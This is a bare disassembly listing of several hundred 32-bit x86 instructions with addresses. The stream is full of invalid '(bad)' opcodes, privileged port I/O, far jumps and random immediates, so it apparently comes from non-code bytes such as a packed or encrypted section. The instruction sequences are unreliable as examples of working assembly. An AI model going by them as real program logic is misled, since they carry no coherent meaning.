  432b9d:	add    eax,0x6092499e
  432ba2:	xchg   edx,eax
  432ba3:	loope  0x432b61
  432ba5:	mov    ch,0x35
  432ba7:	fcomi  st,st(7)
  432ba9:	xchg   BYTE PTR [eax],ah
  432bab:	inc    ebx
  432bac:	and    eax,0x5effc773
  432bb1:	mov    al,ds:0xd2df317b
  432bb6:	dec    edx
  432bb7:	mov    eax,ds:0xb64b1901
  432bbc:	adc    ebp,DWORD PTR [ebp-0x17acb3fc]
  432bc2:	pop    esp
  432bc3:	ins    BYTE PTR es:[edi],dx
  432bc4:	jecxz  0x432bcc
  432bc6:	dec    edi
  432bc7:	inc    edx
  432bc8:	mov    esp,0x920f979f
  432bcd:	ins    BYTE PTR es:[edi],dx
  432bce:	add    BYTE PTR [edx+0x78eb4c4a],ah
  432bd4:	and    DWORD PTR [ecx],edx
  432bd6:	ja     0x432c3a
  432bd8:	mov    ds:0x80b60d84,eax
  432bdd:	xlat   BYTE PTR ds:[ebx]
  432bde:	jmp    0xa06652cb
  432be3:	loop   0x432b83
  432be5:	or     DWORD PTR [eax],ebp
  432be7:	gs cdq 
  432be9:	pusha  
  432bea:	daa    
  432beb:	push   eax
  432bec:	pop    ecx
  432bed:	call   0xa701376
  432bf2:	out    dx,al
  432bf3:	inc    ebp
  432bf4:	enter  0xe5c3,0xa1
  432bf8:	retf   0x1969
  432bfb:	mov    eax,ds:0xa7267e64
  432c00:	aaa    
  432c01:	adc    BYTE PTR [ecx],ch
  432c03:	sbb    eax,0xaf6c8d37
  432c08:	add    al,ah
  432c0a:	sub    dl,BYTE PTR [eax+ebx*2+0x6a0c43a7]
  432c11:	cmp    al,0xc3
  432c13:	lahf   
  432c14:	imul   ebx,esp,0xe032bf0f
  432c1a:	cmp    dh,al
  432c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432c1d:	jne    0x432c9b
  432c1f:	jno    0x432c37
  432c21:	sub    al,0xe7
  432c23:	pop    ds
  432c24:	ret    0x2cc3
  432c27:	inc    esi
  432c28:	pushf  
  432c29:	loop   0x432c65
  432c2b:	mov    eax,ds:0xfed4868d
  432c30:	gs sub eax,0xc05e6c1d
  432c36:	daa    
  432c37:	xor    cl,BYTE PTR [edi+0x18]
  432c3a:	cli    
  432c3b:	add    ebx,ebx
  432c3d:	pusha  
  432c3e:	test   BYTE PTR [edi],0x19
  432c41:	mov    ds:0xb1d41843,al
  432c46:	out    dx,al
  432c47:	jnp    0x432c4b
  432c49:	mul    DWORD PTR ds:0xba5a98ad
  432c4f:	mov    al,ds:0x1f160dfe
  432c54:	mov    eax,0x5d63db55
  432c59:	(bad)  
  432c5a:	fiadd  DWORD PTR [ecx+ecx*4]
  432c5d:	cmp    al,bh
  432c5f:	std    
  432c60:	jae    0x432c42
  432c62:	std    
  432c63:	js     0x432cbc
  432c65:	and    edx,DWORD PTR [ebx-0x730af45f]
  432c6b:	sub    esp,DWORD PTR [ebp+0x5eb4cb9c]
  432c71:	call   0x1d66:0x3a182c36
  432c78:	mul    BYTE PTR [eax+0x1f]
  432c7b:	out    0x1,eax
  432c7d:	jecxz  0x432c54
  432c7f:	popa   
  432c80:	jo     0x432cd3
  432c82:	jmp    0xddfb:0x21bac0a7
  432c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432c8a:	sahf   
  432c8b:	push   ecx
  432c8c:	jb     0x432c32
  432c8e:	pop    ebp
  432c8f:	fild   QWORD PTR [ebx-0x28bf6520]
  432c95:	in     eax,dx
  432c96:	out    dx,al
  432c97:	arpl   WORD PTR [esi-0x64f0e70b],dx
  432c9d:	pop    ecx
  432c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432c9f:	lea    esp,[ecx]
  432ca1:	(bad)  
  432ca2:	or     cl,ah
  432ca4:	pop    es
  432ca5:	push   eax
  432ca6:	mov    ebp,0xee1081bf
  432cab:	fs jbe 0x432ce7
  432cae:	and    eax,0xc4d8f8a4
  432cb3:	mov    al,ds:0x88c544dc
  432cb8:	sar    esp,cl
  432cba:	cmp    al,0x14
  432cbc:	pop    esi
  432cbd:	imul   eax,DWORD PTR [edi-0x43],0x831da71f
  432cc4:	aas    
  432cc5:	pusha  
  432cc6:	add    esi,esi
  432cc8:	mov    bh,0x2f
  432cca:	jno    0x432c64
  432ccc:	mov    edi,0x5e0c469c
  432cd1:	pop    ds
  432cd2:	mov    cl,0x4d
  432cd4:	imul   esi,DWORD PTR [edi+0x6052b9c5],0x10f2b886
  432cde:	jno    0x432d17
  432ce0:	push   ds
  432ce1:	mov    eax,ds:0x4a376284
  432ce6:	ret    
  432ce7:	mov    al,ds:0x5b882785
  432cec:	pop    ebp
  432ced:	mov    bh,dl
  432cef:	mov    al,ds:0x2e8d62da
  432cf4:	imul   esi,DWORD PTR [edx],0x78
  432cf7:	pusha  
  432cf8:	pop    esi
  432cf9:	(bad)  
  432cfa:	xchg   ebx,eax
  432cfb:	and    DWORD PTR [eax-0x1098cf5c],ecx
  432d01:	push   edx
  432d02:	inc    eax
  432d03:	sub    ecx,ebp
  432d05:	ss cs pop ebp
  432d08:	mov    edx,0xf50a1706
  432d0d:	retf   0x54ee
  432d10:	fidivr WORD PTR [ecx-0x19c6f469]
  432d16:	inc    edx
  432d17:	mov    eax,ds:0xe19e0049
  432d1c:	arpl   WORD PTR [ecx-0x1],cx
  432d1f:	in     eax,0x5e
  432d21:	ins    BYTE PTR es:[edi],dx
  432d22:	add    al,0xf5
  432d24:	dec    edi
  432d25:	outs   dx,DWORD PTR ds:[esi]
  432d26:	push   eax
  432d27:	daa    
  432d28:	pop    ebx
  432d29:	pusha  
  432d2a:	leave  
  432d2b:	imul   esi,DWORD PTR [ebx-0x2e2d9518],0xde5d5e81
  432d35:	(bad)  
  432d36:	out    dx,al
  432d37:	(bad)  
  432d38:	jmp    0xb22db861
  432d3d:	leave  
  432d3e:	adc    eax,0x1817ca9f
  432d43:	dec    ebx
  432d44:	punpcklwd mm5,mm0
  432d47:	mov    dl,0x43
  432d49:	push   cs
  432d4a:	xchg   DWORD PTR [edx],ecx
  432d4c:	push   ss
  432d4d:	xor    al,0x7c
  432d4f:	mov    eax,ds:0x23522f88
  432d54:	jp     0x432d8d
  432d56:	cld    
  432d57:	mov    al,ds:0xbbec76bf
  432d5c:	fcmovnb st,st(2)
  432d5e:	add    eax,0xece4f2b1
  432d63:	mul    BYTE PTR [ebx]
  432d65:	rcr    BYTE PTR [ecx],1
  432d67:	jmp    0x432d57
  432d69:	and    BYTE PTR [edi+edi*2],bh
  432d6c:	(bad)  
  432d6d:	pusha  
  432d6e:	lods   al,BYTE PTR ds:[esi]
  432d6f:	push   eax
  432d70:	stos   DWORD PTR es:[edi],eax
  432d71:	xchg   ecx,eax
  432d72:	into   
  432d73:	jp     0x432d16
  432d75:	add    eax,0x810347ee
  432d7a:	jns    0x432da7
  432d7c:	and    DWORD PTR [esi+0x2c],ecx
  432d7f:	mov    al,ds:0x2c085851
  432d84:	ds or  al,0x32
  432d87:	fstp   QWORD PTR [edx-0x68]
  432d8a:	out    dx,al
  432d8b:	mov    al,0x3b
  432d8d:	dec    ebp
  432d8e:	mov    esi,0xf6abf56d
  432d93:	mov    ds:0x29e36a65,eax
  432d98:	hlt    
  432d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432d9a:	ds jo  0x432e1a
  432d9d:	xchg   ebx,eax
  432d9e:	out    dx,eax
  432d9f:	mov    ah,0x87
  432da2:	jle    0x432e05
  432da4:	out    0x34,eax
  432da6:	or     al,0x60
  432da8:	sub    al,0x2b
  432daa:	cmp    al,0xa1
  432dac:	scas   al,BYTE PTR es:[edi]
  432dad:	cmp    dl,BYTE PTR [esi]
  432daf:	nop
  432db0:	stos   DWORD PTR es:[edi],eax
  432db1:	ja     0x432d64
  432db3:	jae    0x432e13
  432db5:	sbb    eax,0x3d86c16f
  432dba:	test   eax,0x6ec9bc0a
  432dbf:	and    al,0x3a
  432dc1:	loop   0x432d52
  432dc3:	es pop esi
  432dc5:	mov    edx,0xb335adb0
  432dca:	xchg   ecx,eax
  432dcb:	lods   eax,DWORD PTR ds:[esi]
  432dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432dcd:	bound  esp,QWORD PTR [eax+0x70]
  432dd0:	jecxz  0x432d5a
  432dd2:	ja     0x432df5
  432dd4:	fs adc al,bh
  432dd7:	xchg   ebp,eax
  432dd8:	sti    
  432dd9:	mov    al,ds:0xea1dd3ed
  432dde:	out    0x1a,al
  432de0:	pop    esi
  432de1:	test   BYTE PTR [eax+0x5e],dl
  432de4:	pop    es
  432de5:	lea    eax,cs:[ebp-0xb]
  432de9:	pusha  
  432dea:	popf   
  432deb:	(bad)  
  432dec:	loope  0x432e27
  432dee:	js     0x432e34
  432df0:	adc    eax,0x50b7ee23
  432df5:	or     DWORD PTR [eax+0x6634fad5],eax
  432dfb:	mov    eax,ds:0x4dd34b5f
  432e00:	adc    al,0xb8
  432e02:	outs   dx,BYTE PTR ds:[esi]
  432e03:	sbb    BYTE PTR [esi+0x79],0x81
  432e07:	je     0x432dc9
  432e09:	iret   
  432e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432e0b:	sbb    eax,0xa0f423d8
  432e10:	adc    ch,BYTE PTR [ecx+edi*2]
  432e13:	sti    
  432e14:	jmp    edx
  432e16:	lds    esi,FWORD PTR [ecx+0x5e]
  432e19:	in     al,dx
  432e1a:	(bad)
  432e1e:	add    BYTE PTR [esi],0x17
  432e21:	popa   
  432e22:	xor    al,0x74
  432e24:	sahf   
  432e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432e26:	sbb    al,BYTE PTR [edi-0x7b]
  432e29:	repnz out dx,al
  432e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432e2c:	(bad)  [ecx]
  432e2e:	int3   
  432e2f:	dec    esi
  432e30:	cmp    ecx,edi
  432e32:	(bad)  
  432e33:	lods   al,BYTE PTR ds:[esi]
  432e34:	cdq    
  432e35:	cld    
  432e36:	ins    DWORD PTR es:[edi],dx
  432e37:	xor    eax,ebp
  432e39:	inc    esi
  432e3a:	push   esi
  432e3b:	adc    edi,edx
  432e3d:	jo     0x432e0d
  432e3f:	push   eax
  432e40:	pop    edx
  432e41:	nop
  432e42:	mov    eax,DWORD PTR [ecx-0x7d9192f8]
  432e48:	aam    0x1d
  432e4a:	hlt    
  432e4b:	mov    al,ds:0xcf4cce24
  432e50:	arpl   WORD PTR [edx+ebp*1+0x5a],bx
  432e54:	pop    esi
  432e55:	je     0x432e23
  432e57:	int    0x10
  432e59:	xor    dl,bl
  432e5b:	(bad)  
  432e5c:	shl    BYTE PTR [eax-0x69],cl
  432e5f:	jo     0x432e5d
  432e61:	cdq    
  432e62:	xchg   ebx,eax
  432e63:	js     0x432ec6
  432e65:	outs   dx,DWORD PTR ds:[esi]
  432e66:	in     eax,dx
  432e67:	jae    0x432e00
  432e69:	adc    ah,BYTE PTR [edx]
  432e6b:	push   edx
  432e6c:	add    al,0xcc
  432e6e:	fimul  WORD PTR [edi+0x28fc5e9a]
  432e74:	jmp    0xa5b9:0x9e94c18e
  432e7b:	pop    esp
  432e7c:	pop    esi
  432e7d:	jmp    DWORD PTR [edi+0x4710ce7f]
  432e83:	sbb    bl,BYTE PTR [edi-0x10f34ea0]
  432e89:	lds    edx,FWORD PTR [edi-0x11416339]
  432e8f:	inc    edi
  432e90:	repz mov al,ds:0x82f7db0
  432e96:	xchg   esp,eax
  432e97:	mov    eax,ds:0xc366e5e4
  432e9c:	sbb    al,0x79
  432e9e:	(bad)  
  432e9f:	fcomp  QWORD PTR [ebx+0xd]
  432ea2:	lock inc edi
  432ea4:	scas   al,BYTE PTR es:[edi]
  432ea5:	neg    esi
  432ea7:	cwde   
  432ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432ea9:	inc    edi
  432eaa:	das    
  432eab:	mov    eax,ds:0x4e4266b2
  432eb0:	iret   
  432eb1:	fstp   TBYTE PTR [ebx-0x3aa0a1f1]
  432eb7:	outs   dx,BYTE PTR ds:[esi]
  432eb8:	jns    0x432ec8
  432eba:	fistp  WORD PTR [ebp+0x26]
  432ebd:	mov    ebp,0x469daf4d
  432ec2:	out    dx,al
  432ec3:	pushf  
  432ec4:	int    0x8e
  432ec6:	push   ss
  432ec7:	add    BYTE PTR [edx-0x488d113b],bh
  432ecd:	mov    eax,ds:0x8382e75a
  432ed2:	xor    DWORD PTR [ecx-0x5a68c93a],esp
  432ed8:	push   ebp
  432ed9:	cmp    eax,0x2d5352dd
  432ede:	adc    al,BYTE PTR [edi-0x3b3940a2]
  432ee4:	(bad)  
  432ee5:	push   ds
  432ee6:	in     eax,0xa0
  432ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432ee9:	push   cs
  432eea:	sub    eax,0x72c707dc
  432eef:	mov    eax,0x6048ab4b
  432ef4:	pop    esi
  432ef5:	loopne 0x432f16
  432ef7:	cmp    al,0x1c
  432ef9:	pop    ebx
  432efa:	inc    ecx
  432efb:	in     al,dx
  432efc:	popaw  
  432efe:	cmp    eax,0xbcc3e875
  432f03:	sub    BYTE PTR ds:0xa601eee3,al
  432f09:	popf   
  432f0a:	out    0xbf,eax
  432f0c:	adc    ebp,DWORD PTR [edi-0x3c]
  432f0f:	mov    esi,0xa16a3def
  432f14:	repz ds pushf 
  432f17:	mov    WORD PTR [esi+0xc4feb87],gs
  432f1d:	push   ds
  432f1e:	xchg   esp,eax
  432f1f:	sbb    ch,0xf0
  432f22:	scas   al,BYTE PTR es:[edi]
  432f23:	gs addr16 popa 
  432f26:	das    
  432f27:	arpl   WORD PTR [edx+0x1bbbda25],cx
  432f2d:	aad    0xf5
  432f2f:	adc    eax,0xa1412c17
  432f34:	bound  edi,QWORD PTR [esi+0x61122a0b]
  432f3a:	xchg   ebx,eax
  432f3b:	mov    al,ds:0x35fcf139
  432f40:	mov    ds,WORD PTR [eax+0x395e9e86]
  432f46:	nop
  432f47:	or     dl,al
  432f49:	neg    BYTE PTR [edi]
  432f4b:	pushf  
  432f4c:	cmp    ah,BYTE PTR [edi+esi*2+0x10]
  432f50:	fild   DWORD PTR [edx-0x28]
  432f53:	sbb    al,0x6b
  432f55:	dec    esi
  432f56:	jecxz  0x432f54
  432f58:	(bad)  
  432f59:	fld    DWORD PTR [esi-0x79c8399e]
  432f5f:	ficomp DWORD PTR [esi-0x7c]
  432f62:	mov    ecx,0x31c581fa
  432f67:	push   cs
  432f68:	call   0xf4e49394
  432f6d:	int    0xe3
  432f6f:	retf   0x432f
  432f72:	add    al,0xd9
  432f74:	pop    esi
  432f75:	dec    ebx
  432f76:	xchg   edx,eax
  432f77:	pop    ds
  432f78:	mov    ah,0xd5
  432f7a:	fadd   DWORD PTR [edi]
  432f7c:	jge    0x432fde
  432f7e:	add    DWORD PTR [edi-0x33],eax
  432f81:	jnp    0x432fd5
  432f83:	jecxz  0x432fec
  432f85:	std    
  432f86:	jmp    0x432f7b
  432f88:	pop    esp
  432f89:	ins    DWORD PTR es:[edi],dx
  432f8a:	imul   edx,ebx,0xf289d11e
  432f90:	sbb    ebx,DWORD PTR [edx-0x1f]
  432f93:	nop
  432f94:	stc    
  432f95:	in     eax,dx
  432f96:	(bad)  
  432f97:	lods   al,BYTE PTR ds:[si]
  432f99:	sar    al,1
  432f9b:	sub    al,0xef
  432f9d:	sbb    dh,al
  432f9f:	inc    bl
  432fa1:	loopne 0x432fdd
  432fa3:	and    DWORD PTR [eax],0x9369e75
  432fa9:	mov    ebp,0x354da3e4
  432fae:	or     eax,0x76929fc3
  432fb3:	mov    al,0x4a
  432fb5:	jl     0x432fa2
  432fb7:	(bad)  
  432fb8:	adc    edi,DWORD PTR [eax+0x47]
  432fbb:	cld    
  432fbc:	js     0x432f8e
  432fbe:	scas   eax,DWORD PTR es:[edi]
  432fbf:	xor    BYTE PTR [edx+ebx*2],0x4c
  432fc3:	cs inc esp
  432fc5:	and    eax,edx
  432fc7:	and    BYTE PTR [ebx+eax*2],0x95
  432fcb:	adc    al,0x5e
  432fcd:	jb     0x432fcd
  432fcf:	test   eax,0xbaedfde5
  432fd4:	add    esi,DWORD PTR [edx+0x5e]
  432fd7:	test   BYTE PTR [esi-0x1f],ch
  432fda:	out    dx,eax
  432fdb:	sbb    dl,ch
  432fdd:	cs data16 loope 0x433018
  432fe1:	call   0x68fda738
  432fe6:	mov    bh,0x8
  432fe8:	out    0xed,eax
  432fea:	push   ebx
  432feb:	pop    ecx
  432fec:	fsubrp st(6),st
  432fee:	and    eax,0xee35322c
  432ff3:	in     al,0x3a
  432ff5:	pop    ss
  432ff6:	ins    BYTE PTR es:[edi],dx
  432ff7:	or     cl,BYTE PTR [esi]
  432ff9:	xlat   BYTE PTR ds:[ebx]
  432ffa:	xchg   ebx,eax
  432ffb:	mov    eax,ds:0x93eb8f15
  433000:	pushf  
  433001:	sahf   
  433002:	push   esi
  433003:	nop
  433004:	pop    esi
  433005:	mov    ds:0x25a64314,al
  43300a:	mov    ecx,ecx
  43300c:	lahf   
  43300d:	pusha  
  43300e:	pop    es
  43300f:	ret    0x7c0c
  433012:	test   BYTE PTR [edi+0x63],dl
  433015:	test   al,0xee
  433017:	mov    ds:0x49741912,eax
  43301c:	std    
  43301d:	in     al,0x34
  43301f:	mov    eax,ds:0xba5b1bb8
  433024:	int3   
  433025:	xchg   esp,eax
  433026:	sub    ecx,ebx
  433028:	push   ss
  433029:	xor    eax,0x45f1a1d2
  43302e:	arpl   WORD PTR [esi+0x64def950],sp
  433034:	cs pusha 
  433036:	fcomp  QWORD PTR [esi+edi*4+0xb]
  43303a:	popa   
  43303b:	leave  
  43303c:	mov    cl,0x9b
  43303e:	repz loopne 0x43301b
  433041:	push   0xfffffff8
  433043:	and    eax,0xe5f4625e
  433048:	sub    eax,0x1644ab8a
  43304d:	popa   
  43304e:	fwait
  43304f:	pusha  
  433050:	jnp    0x4330b7
  433052:	retf   0x91de
  433055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433056:	add    dl,BYTE PTR [ebp+0x42]
  433059:	pop    edx
  43305a:	outs   dx,BYTE PTR ds:[esi]
  43305b:	lds    esi,FWORD PTR ds:0x3c7b022e
  433061:	popa   
  433062:	mov    ebx,0x5a1b5585
  433067:	or     BYTE PTR [eax-0x29],bh
  43306a:	push   es
  43306b:	sbb    al,0xc6
  43306d:	push   ebx
  43306e:	es xchg edi,eax
  433070:	test   al,0x60
  433072:	stos   DWORD PTR es:[edi],eax
  433073:	sub    al,BYTE PTR cs:[edx]
  433076:	dec    edi
  433077:	xor    BYTE PTR [esi-0x69],0xa
  43307b:	sbb    eax,0xfeeb0409
  433080:	ror    BYTE PTR [edx-0x2d4f8ece],0xe2
  433087:	out    dx,eax
  433088:	or     ebx,DWORD PTR [edx-0x20]
  43308b:	sti    
  43308c:	xchg   di,ax
  43308e:	dec    esi
  43308f:	inc    edx
  433090:	into   
  433091:	xchg   ecx,eax
  433092:	add    dh,cl
  433094:	sti    
  433095:	inc    edx
  433096:	out    dx,al
  433097:	or     al,0x7c
  433099:	push   edx
  43309a:	push   cs
  43309b:	mov    ah,0x61
  43309d:	aas    
  43309e:	pop    ds
  43309f:	mov    ds:0xfdadc3bf,al
  4330a4:	addr16 sbb al,0x21
  4330a7:	loope  0x433112
  4330a9:	gs xchg edx,eax
  4330ab:	ins    DWORD PTR es:[edi],dx
  4330ac:	pop    esi
  4330ad:	sar    BYTE PTR [edx+ebp*8+0x86e27e9],cl
  4330b4:	into   
  4330b5:	pusha  
  4330b6:	inc    esi
  4330b7:	xor    ebp,edi
  4330b9:	mov    ds:0x8a8092b7,al
  4330be:	loope  0x433046
  4330c0:	xor    edx,DWORD PTR [ecx]
  4330c2:	add    ah,BYTE PTR [eax]
  4330c4:	push   ecx
  4330c5:	ins    DWORD PTR es:[edi],dx
  4330c6:	sbb    BYTE PTR [ecx+0x427d6682],ah
  4330cc:	outs   dx,DWORD PTR ds:[esi]
  4330cd:	inc    ebx
  4330ce:	cmp    DWORD PTR [ecx-0x7d8a9ef7],edx
  4330d4:	in     al,dx
  4330d5:	cmp    ebx,DWORD PTR [esi]
  4330d7:	inc    edi
  4330d8:	pop    ebx
  4330d9:	lock loop 0x433153
  4330dc:	inc    edi
  4330dd:	bound  edi,QWORD PTR [esi]
  4330df:	test   eax,0xa18cb2d7
  4330e4:	lds    esi,FWORD PTR [eax+0x182c8851]
  4330ea:	gs push 0x4ed2f25e
  4330f0:	mov    al,ds:0xa5234d03
  4330f5:	and    DWORD PTR [ebx],esi
  4330f7:	mov    al,0xf7
  4330f9:	xchg   ebx,eax
  4330fa:	in     eax,dx
  4330fb:	stc    
  4330fc:	lahf   
  4330fd:	xor    BYTE PTR [edx],ch
  4330ff:	jb     0x433140
  433101:	mov    esp,0x6bd5511
  433106:	out    dx,al
  433107:	push   0xfffffff8
  433109:	sbb    al,0x15
  43310c:	mov    ecx,0x63c57613
  433111:	add    DWORD PTR [ecx],ecx
  433113:	mov    eax,ds:0x9dd0b8e2
  433118:	int3   
  433119:	sahf   
  43311a:	cmc    
  43311b:	mov    esi,0xa17f0d11
  433120:	xchg   esp,eax
  433121:	pop    edi
  433122:	(bad)  [ebp-0x5e66d67b]
  433128:	out    0xf1,eax
  43312a:	jp     0x4330b4
  43312c:	or     BYTE PTR [edi],bl
  43312e:	leave  
  43312f:	nop
  433130:	pop    edi
  433131:	inc    ecx
  433132:	shl    BYTE PTR [esi+eiz*8-0x39],cl
  433136:	iret   
  433137:	xor    BYTE PTR [eax+eax*1],ch
  43313a:	inc    ebp
  43313b:	stos   BYTE PTR es:[edi],al
  43313c:	addr16 sbb bl,al
  43313f:	mov    al,ds:0xe14126cf
  433144:	mov    ds:0x5ef8a06f,al
  433149:	pop    eax
  43314a:	fistp  DWORD PTR [ebx-0x5c]
  43314d:	test   ebp,ecx
  43314f:	in     al,0x8c
  433151:	push   ecx
  433152:	fdiv   QWORD PTR [edi+0x60cde0b7]
  433158:	cdq    
  433159:	add    dl,BYTE PTR [esi-0x116b3d93]
  43315f:	daa    
  433160:	fwait
  433161:	add    al,0x4f
  433163:	pusha  
  433164:	push   0x79a128ee
  433169:	xor    al,0xae
  43316b:	clc    
  43316c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43316d:	pop    ds
  43316e:	(bad)  
  43316f:	mov    ah,0x35
  433171:	or     DWORD PTR [edx-0x4cfbf6df],ebx
  433177:	mov    ds:0x9b4f4c94,al
  43317c:	push   ds
  43317d:	mov    edx,0x6572480c
  433182:	out    dx,al
  433183:	sub    cl,BYTE PTR [edx+0x2369c638]
  433189:	repz in eax,dx
  43318b:	aaa    
  43318c:	push   esp
  43318d:	pop    esi
  43318e:	jmp    0xc258:0x1eeb389c
  433195:	arpl   WORD PTR [esi],bx
  433197:	mov    dh,0x59
  433199:	in     eax,0xdd
  43319b:	pop    eax
  43319c:	jmp    0x7f27e13f
  4331a1:	mov    bl,0xc1
  4331a3:	retf   0x367e
  4331a6:	mov    ds,WORD PTR [eax+0x75]
  4331a9:	scas   eax,DWORD PTR es:[edi]
  4331aa:	out    dx,al
  4331ab:	mov    ds:0x6b0b9e34,eax
  4331b0:	rcr    ch,cl
  4331b2:	cmp    BYTE PTR [ecx+0x498fcc31],ah
  4331b8:	push   0x5e17d3d1
  4331bd:	(bad)  
  4331be:	cli    
  4331bf:	pop    ebx
  4331c0:	clc    
  4331c1:	mov    WORD PTR [ebx-0x65a5ae33],?
  4331c7:	dec    esi
  4331c8:	popa   
  4331c9:	dec    ecx
  4331ca:	pop    ebx
  4331cb:	xchg   ecx,eax
  4331cc:	cdq    
  4331cd:	dec    ebp
  4331ce:	bound  ebx,QWORD PTR [eax+0x7cab775e]
  4331d4:	xchg   DWORD PTR [esi],ebp
  4331d6:	sub    bl,BYTE PTR [edi+edi*1+0x59e8265c]
  4331dd:	xchg   esp,eax
  4331de:	xor    eax,0x21dad761
  4331e3:	mov    BYTE PTR [ebx-0x70],bh
  4331e6:	push   ebx
  4331e7:	test   DWORD PTR [ebx+0x5b],0x1b5ea3f3
  4331ee:	push   ecx
  4331ef:	mov    al,ds:0xa0cd9d62
  4331f4:	iret   
  4331f5:	mov    edi,0x1d317487
  4331fa:	into   
  4331fb:	push   edi
  4331fc:	pop    esi
  4331fd:	lock adc eax,0x5be50726
  433204:	cmp    DWORD PTR [ecx+0x7e],esp
  433207:	jb     0x43325d
  433209:	ds xor al,0x9d
  43320c:	mov    ebp,0x8b0febdd
  433211:	pop    ecx
  433212:	mov    ebp,0xd4c96567
  433217:	xchg   edi,eax
  433218:	pop    ebp
  433219:	popa   
  43321a:	xor    DWORD PTR [edi],ecx
  43321c:	mov    ds:0x59a72b56,al
  433221:	push   es
  433222:	out    dx,al
  433223:	jmp    0x95f3:0x53ff049e
  43322a:	sub    al,0xa0
  43322c:	cmp    al,0x8b
  43322e:	rol    DWORD PTR [ecx-0x4818df8e],cl
  433234:	stos   BYTE PTR es:[edi],al
  433235:	mov    eax,0xa85e8602
  43323a:	pop    edx
  43323b:	hlt    
  43323c:	adc    edx,esp
  43323e:	int3   
  43323f:	and    eax,0x42c8195d
  433244:	pop    esi
  433245:	jmp    0x43328a
  433247:	adc    ebp,esi
  433249:	jb     0x433235
  43324b:	pop    eax
  43324c:	jl     0x4331d7
  43324e:	out    dx,al
  43324f:	retf   
  433250:	fnsave [ebx+ebp*1+0x3b50107c]
  433257:	mov    eax,ds:0x1098f428
  43325c:	lea    ebp,[edx+0x2c]
  43325f:	xor    DWORD PTR [esi],esp
  433261:	pop    ecx
  433262:	adc    DWORD PTR [ebp+ebx*8-0x7f7f876f],esp
  433269:	rol    BYTE PTR ds:0xd160a6c0,0xe2
  433270:	shl    BYTE PTR ds:0xc4f4de26,1
  433276:	and    BYTE PTR ds:0x28a0d244,bh
  43327c:	inc    eax
  43327d:	loope  0x43328c
  43327f:	(bad)  
  433280:	fadd   QWORD PTR [ecx+ebp*2-0x5e]
  433284:	cmp    ecx,edx
  433286:	(bad)  
  433287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433288:	push   cs
  433289:	xor    eax,0x8bb084d5
  43328e:	in     eax,dx
  43328f:	repz add ebx,DWORD PTR [ebp-0x3b]
  433293:	lahf   
  433294:	int    0xd0
  433296:	push   ds
  433297:	stc    
  433298:	xchg   esi,eax
  433299:	sub    esi,DWORD PTR [eax+0x40610d74]
  43329f:	lahf   
  4332a0:	inc    esi
  4332a1:	test   DWORD PTR [edx-0x11b7c6c1],eax
  4332a7:	ss push 0xffffffb8
  4332aa:	adc    edi,0x9fa52e66
  4332b0:	sahf   
  4332b1:	test   ah,0x7c
  4332b4:	sahf   
  4332b5:	mov    bl,0x1d
  4332b7:	mov    edx,0x9b5a5ae9
  4332bc:	pop    esi
  4332bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4332be:	jbe    0x43329a
  4332c0:	dec    edi
  4332c1:	ss sbb al,0x36
  4332c4:	adc    al,0x61
  4332c6:	and    edx,edx
  4332c8:	into   
  4332c9:	xchg   BYTE PTR [eax],dh
  4332cb:	(bad)  
  4332cc:	cs jge 0x4332bc
  4332cf:	jnp    0x433287
  4332d1:	pop    eax
  4332d2:	cs mov ah,0x38
  4332d5:	arpl   WORD PTR [esi+0x5],ax
  4332d8:	push   ebx
  4332d9:	adc    eax,0x15e2d45
  4332de:	sar    BYTE PTR [edx],1
  4332e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4332e1:	ret    
  4332e2:	neg    ebx
  4332e4:	pop    esi
  4332e5:	jno    0x43334f
  4332e7:	(bad)
  4332ec:	fs mov bl,0x77
  4332ef:	mov    eax,ds:0xb57f0097
  4332f4:	lods   eax,DWORD PTR ds:[esi]
  4332f5:	into   
  4332f6:	or     al,dh
  4332f8:	pop    esi
  4332f9:	mov    ebp,0x420115ba
  4332fe:	xchg   BYTE PTR [ecx-0x65c09f0b],bl
  433304:	and    edi,0x4e99559b
  43330a:	out    dx,al
  43330b:	dec    edx
  43330c:	dec    ebp
  43330d:	dec    esi
  43330e:	mov    al,ds:0x89714049
  433313:	mov    eax,ds:0x981ccb53
  433318:	mov    dh,0x64
  43331a:	jne    0x433300
  43331c:	pop    edi
  43331d:	fnstenv [ecx*4+0x193e95f4]
  433324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433325:	inc    esi
  433326:	push   ebx
  433327:	mov    eax,ds:0xca717df7
  43332c:	sbb    eax,0x51947100
  433331:	sbb    al,BYTE PTR [edi+esi*8+0x1aa2d1f2]
  433338:	daa    
  433339:	mov    eax,ds:0xea1c3de6
  43333e:	xor    esp,DWORD PTR [ecx+0x65c4686b]
  433344:	mov    ah,0x3e
  433346:	mov    cl,0x7b
  433348:	pop    ebp
  433349:	push   ebp
  43334a:	adc    al,0xe1
  43334c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43334d:	inc    edx
  43334e:	shl    ecx,cl
  433350:	sahf   
  433351:	sbb    al,0x8f
  433353:	neg    DWORD PTR [edx+eax*2+0x15]
  433357:	movhps QWORD PTR [esi],xmm3
  43335a:	jae    0x433304
  43335c:	mov    bl,0x49
  43335e:	pop    esi
  43335f:	imul   ebp,esp,0xf32bee36
  433365:	mov    ds:0x95fc543e,al
  43336a:	cli    
  43336b:	mov    al,ds:0xbcb6ee90
  433370:	mov    bl,0xf7
  433372:	or     DWORD PTR [eax],edi
  433374:	fs inc esi
  433376:	or     al,BYTE PTR [ecx]
  433378:	fstp   TBYTE PTR [edi]
  43337a:	mov    al,ds:0x466b145b
  43337f:	cdq    
